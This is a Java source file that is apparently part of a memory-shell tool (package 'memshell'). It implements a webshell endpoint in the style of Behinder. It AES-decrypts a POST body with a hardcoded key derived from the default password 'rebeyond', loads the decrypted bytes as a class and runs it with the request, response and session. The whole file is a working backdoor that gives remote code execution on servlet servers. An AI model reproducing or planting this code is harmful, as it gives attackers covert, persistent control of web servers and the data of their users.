package net.rebeyond.memshell;

import net.rebeyond.memshell.redefine.MyRequest;
import net.rebeyond.memshell.redefine.MyResponse;
import net.rebeyond.memshell.redefine.MySession;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;


public class Evaluate {

    private static final long serialVersionUID = 1L;

    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        doPost(request, response);
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            if (MyRequest.getMethod(request).equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                MySession.setAttribute(MyRequest.getSession(request),"u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                Object[] objects = new Object[]{request,response,MyRequest.getSession(request)};
                
                BufferedReader bf = MyRequest.getReader(request);
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                String sb = new String(evilClassBytes);
                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                Object a = evilClass.newInstance();
                a.equals(objects);
                return;
            }
            } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
